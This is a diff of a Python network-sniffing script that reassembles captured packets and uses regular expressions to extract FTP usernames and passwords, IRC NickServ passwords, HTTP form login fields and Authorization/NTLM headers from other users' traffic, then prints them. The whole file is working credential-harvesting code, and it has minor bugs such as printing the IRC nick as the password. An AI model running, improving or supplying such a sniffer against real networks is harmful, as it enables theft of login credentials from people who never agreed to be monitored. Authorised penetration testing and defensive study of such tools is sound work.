@@ -69,7 +69,6 @@ def frag_remover(ack, load):
                 # If load > 75,000 chars, just keep the last 200 chars
                 pkt_frag_loads[ip_port][ack] = pkt_frag_loads[ip_port][ack][-200:]
 
-
 def frag_joiner(ack, src_ip_port, load):
     '''
     Keep a store of previous fragments in an OrderedDict named pkt_frag_loads
@@ -80,6 +79,7 @@ def frag_joiner(ack, src_ip_port, load):
                 # Make pkt_frag_loads[src_ip_port][ack] = full load
                 old_load = pkt_frag_loads[src_ip_port][ack]
                 concat_load = old_load + load
+
                 return OrderedDict([(ack, concat_load)])
 
     return OrderedDict([(ack, load)])
@@ -107,16 +107,7 @@ def pkt_parser(pkt):
         # [1:-1] just gets eliminates the single quotes at start and end
         str_load = repr(full_load)[1:-1]
 
-        # Try not to regex every packet
-        #if len(str_load) < 150:
-        #    # FTP
-        #    ftp_user = re.match(r'USER (.*)\\r\\n', str_load)
-        #    if ftp_user:
-        #        print 'FTP User: ', ftp_user.group(1)
-        #    else:
-        #        ftp_pass = re.match(r'PASS (.*)\\r\\n', str_load)
-        #        if ftp_pass:
-        #            print 'FTP Pass: ', ftp_pass.group(1)
+        # Limit the packets we regex to increase efficiency
         if len(str_load) < 150:
             # FTP
             ftp_user = re.match(r'USER (.*)\\r\\n', str_load)
@@ -128,16 +119,14 @@ def pkt_parser(pkt):
 
             # IRC
             irc_user_re = re.match(r'NICK (\w)', str_load)
+            irc_pass_re = re.match(r'NS IDENTIFY (\w)', str_load)
             if irc_user_re:
                 print 'IRC nick: ', irc_user_re.group(1)
-            irc_pass_re = re.match(r'NS IDENTIFY (\w)', str_load)
             if irc_pass_re:
                 print 'IRC pass: ', irc_user_re.group(1)
 
         # HTTP
-        http_creds = http_parser(full_load, str_load)
-       #http_creds = http_parser(str_load)
-
+        http_parser(full_load, str_load)
 
 class HTTPRequest(BaseHTTPRequestHandler):
     '''
@@ -157,55 +146,85 @@ def http_parser(full_load, str_load):
     '''
     Pull out pertinent info from the parsed HTTP packet data
     '''
+    user_passwd = None
+    auth_header = None
+    http_ntlm = None
     request = HTTPRequest(full_load)
-    if request.error_code == None:
+
+    if request.error_code == None: # What about 401 headers like NTLM over HTTP uses?
         try:
             cmd = request.command
             path = request.path
             host = request.headers['host']
-            url = cmd + ' ' + host + path
-            print url
+            cmd_url = cmd + ' ' + host + path
+            url_printer(cmd_url)
+
+
             data = str_load.split(r'\r\n\r\n', 1)[1]
             if data != '':
+                user_passwd = get_login_pass(data)
+            # Grab authorization headers
+            if 'authorization' in request.headers:
+                auth_header = request.headers['authorization']
+                if ' NTLM' in auth_header:
+                    ntlm_hash = auth_header.strip(' NTLM ')
 
+                # Get NTLM over HTTP
+                #if ' NTLM' in auth_header:
 
         ################## DEBUG ########################
-        except: # no request.headers or request.header[host]
+        except Exception as e:
             print ' ****************** ERROR'
-            print str_load
-            raise
+            print str(e)
+            print str_load[:100]
+        ################## DEBUG ########################
+
+    if user_passwd != None:
+        print 'User:', user_passwd[0]
+        print 'Pass:', user_passwd[1]
+        print ''
+    if auth_header != None:
+        print auth_header
+        print ''
+
+def url_printer(cmd_url):
+    '''
+    Filter out the common but uninteresting URLs
+    '''
+    d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
+    if any(cmd_url.endswith(i) for i in d):
+        return
+
+    print cmd_url[:175]
 
 def get_login_pass(data):
     '''
     Regex out logins and passwords from a string
     '''
+    user = None
+    passwd = None
+
     # Taken mainly from Pcredz by Laurent Gaffie
-    http_userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
-                       'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
-                       'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
-                       'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
-                       'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
-    http_passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
-                       'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
-                       'passwort', 'passwrd', 'wppassword', 'upasswd']
+    userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
+    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
+                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
+                  'passwort', 'passwrd', 'wppassword', 'upasswd']
 
-    ################ WORK ############################
-    #username = re.findall(user_regex, self.body)
-    #password = re.findall(pw_regex, self.body)
-    #user = None
-    #pw = None
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, data, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
+    for passfield in passfields:
+        pass_re = re.search('(%s=[^&]+)' % passfield, data, re.IGNORECASE)
+        if pass_re:
+            passwd = pass_re.group()
 
-    #if username:
-    #    for u in username:
-    #        user = u[1]
-    #        break
-
-    #if password:
-    #    for p in password:
-    #        if p[1] != '':
-    #            pw = p[1]
-    #            break
-
+    if user and passwd:
+        return (user, passwd)
 
 def main(args):
 
@@ -214,7 +233,7 @@ def main(args):
     # whatever variable you want within the IPython cli
     #def signal_handler(signal, frame):
     #    embed()
-    #    sniff(iface=conf.iface, prn=pkt_parser, store=0)
+    ##    sniff(iface=conf.iface, prn=pkt_parser, store=0)
     #signal.signal(signal.SIGINT, signal_handler)
     #####################################################
 
